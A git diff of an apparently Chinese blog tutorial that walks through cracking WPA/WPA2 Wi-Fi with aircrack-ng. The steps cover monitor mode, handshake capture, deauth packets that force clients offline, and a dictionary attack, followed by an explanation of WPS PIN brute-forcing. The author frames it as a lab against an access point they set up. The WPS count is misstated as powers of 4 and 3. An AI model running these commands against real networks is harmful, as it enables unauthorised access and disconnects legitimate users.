@@ -128,7 +128,8 @@
 <p>下列操作在 Linux 上实现，window操作类似。</p>
 <p><strong><em>WPA/WPA2破解方法</em></strong></p>
 <p>首先我在另一台电脑上使用无线网卡模拟了一个 AP 环境，把它作为本次实验的目标，也就是我们需要破解的无线网。下图为该网络的信息</p>
-<p><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/tp-link.png" style="text-align:center" alt="tp-link" /></p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/tp-link.png" alt="tp-link" /></div>
+
 <p>执行破解步骤</p>
 <ol>
 <li>
@@ -145,24 +146,27 @@ ifconfig -a
 <pre>
 sudo ifconfig wlp4s0 up
 </pre>
-<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-1.png" style="text-align:center" alt="aircrack-1" /></p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-1.png" alt="aircrack-1" /></div></p>
 </li>
 <li>
 <p>开启监听模式,监听模式下适配器名称会变更，比如我的变成了 wlp4s0mon
 <pre>
 sudo airmon-ng start wlp4s0
 </pre><br>
-<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-2.png" style="text-align:center" alt="aircrack-2" /><br>
-<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-3.png" style="text-align:center" alt="aircrack-3" /></p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-2.png" alt="aircrack-2" /></div></p>
 </li>
-<li>
-<p>获取当前无线网概况，包括AP的SSID、MAC地址、工作频道、无线客户端MAC及数量等
+</ol>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-3.png" alt="aircrack-3" /></div>
+
+<ol>
+<li>获取当前无线网概况，包括AP的SSID、MAC地址、工作频道、无线客户端MAC及数量等
 <pre>
 sudo airodump-ng wlp4s0mon
 </pre><br>
-<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-4.png" style="text-align:center" alt="aircrack-4" /><br>
-记录下自己想要破解的wifi所在的频道，也就是 CH 那列的数字，然后可以 Ctrl+c 结束扫描,我们的目标是 SoftAP ,所以我们记下 1 这个信道</p>
-</li>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-4.png" alt="aircrack-4" /></div></li>
+</ol>
+<p>记录下自己想要破解的wifi所在的频道，也就是 CH 那列的数字，然后可以 Ctrl+c 结束扫描,我们的目标是 SoftAP ,所以我们记下 1 这个信道</p>
+<ol>
 <li>
 <p>选取要破解的无线网络，开始抓包
 <pre>
@@ -170,7 +174,7 @@ sudo airodump-ng -c 1 –w log wlp4s0mon
 # -c 为目标AP的工作频道，我们要进行攻击测试的无线路由器工作频道为1；
 # -w 后跟要保存的文件名，名字随意。要注意的是：这里虽然设置的文件名是log，但是生成的文件却不是log.cap，而是log-01.cap，在进行第二次攻击时，若使用同样文件名log保存的话，就会生成名为log-02.cap的文件。
 </pre><br>
-<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-5.png" style="text-align:center" alt="aircrack-5" /></p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-5.png" alt="aircrack-5" /></div></p>
 </li>
 <li>
 <p>打开一个新的终端，发送名叫“Deauth”的数据包来将已经连接至无线路由器的合法无线客户端强制断开，此时，客户端会自动重新连接无线路由器，我们也可以捕获到包含 WPA-PSK 4次握手验证的数据包了。
@@ -180,26 +184,26 @@ sudo aireplay-ng -0 1 –a 14:CF:92:DB:46:B3 -c CC:3A:61:C9:15:77 wlp4s0mon
 # -a 目标无线网的MAC地址；
 # -c 客户端的MAC地址；
 </pre><br>
-<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-6.png" style="text-align:center" alt="aircrack-6" /><br>
-回到 airodump-ng 界面，右上角会出现 “WPA handshake” 的提示，这表示获得到了包含WPA-PSK密码的4此握手数据报文</p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-6.png" alt="aircrack-6" /></div></p>
 </li>
-<li>
-<p>成功获取到无线WPA-PSK验证数据报文后，就可以开始破解<br>
+</ol>
+<p>回到 airodump-ng 界面，右上角会出现 “WPA handshake” 的提示，这表示获得到了包含WPA-PSK密码的4此握手数据报文</p>
+<ol>
+<li>成功获取到无线WPA-PSK验证数据报文后，就可以开始破解<br>
 此时终端所在工作路径目录内会有以下文件<br>
-<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-7.png" style="text-align:center" alt="aircrack-7" /><br>
-执行
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-7.png" alt="aircrack-7" /></div></li>
+</ol>
+<p>执行
 <pre>
 sudo aircrack-ng -w blackhat/wordlist1.dic log-01.cap
 # -w 后跟预先制作的字典
 </pre><br>
-<img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-8.png" style="text-align:center" alt="aircrack-8" /><br>
-最后记得结束网卡的监听模式
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/wificrack/aircrack-8.png" alt="aircrack-8" /></div></p>
+<p>最后记得结束网卡的监听模式
 <pre>
 sudo airmon-ng stop wlp4s0mon
 </pre><br>
 如果如上图显示，则说明找到了密码，如果没有找到密码的话，可以更换字典，再次尝试对cap文件进行密文比对，直到破解成功。所以说 WPA/WPA2 加密方式破解wifi是有一定几率的，成功与否取决于字典是否强大。</p>
-</li>
-</ol>
 <p>但是，如果采用 WPA/WPA2 加密方式的无线网开启了 WPS ,那就可以直接跑 PIN 码破解wifi</p>
 <p>WPS（Wi-Fi Protected Setup，WiFi保护设置）是由Wi-Fi联盟所推出的 Wi-Fi 安全防护设定搜索标准，与之对应的还有一个名词叫 QSS ，QSS又称快速安全设置，顾名思义，它是一种与无线网络进行快速连接的方式。对于一般用户，WPS提供了一个简单的方法与无线路由器进行快速互联，它会随机产生一个八位数字的字符串作为个人识别号码（PIN）进行加密操作。省去了客户端需要连入无线网络时，必须手动添加网络名称（SSID）及输入冗长的无线加密密码的繁琐过程。但方便的同时伴随而来的就是不安全，根据加密特点，pin码最多为10的8次方，这样一个有极限的数字是肯定可以被爆破出来的，只是要以巨大的时间为代价而已。不过不要紧，它的另外两个特性会大大缩短我们破解的时间。第一个特性是这个8位的 PIN 码的最后一位是一个校验和，也就是说，我们只需要破解前7位就可以了。第二个特性是无线路由器会认证这个 PIN 码的前后两部分，前4位与后3位，如果不正确，它返回一个EAP-NACK信息，根据这个信息我们可以判断出这两部分是否正确，这样我们需要枚举的数字就变成了4的10次方加上3的10次方，也就是11000个。换句话说，由于他的这些特性，我们基本可以在一两个小时以内破解出 PIN 码，破解出来后，再使用相关工具连接即可</p>
 <p>知道了原理，再来说说方法</p>
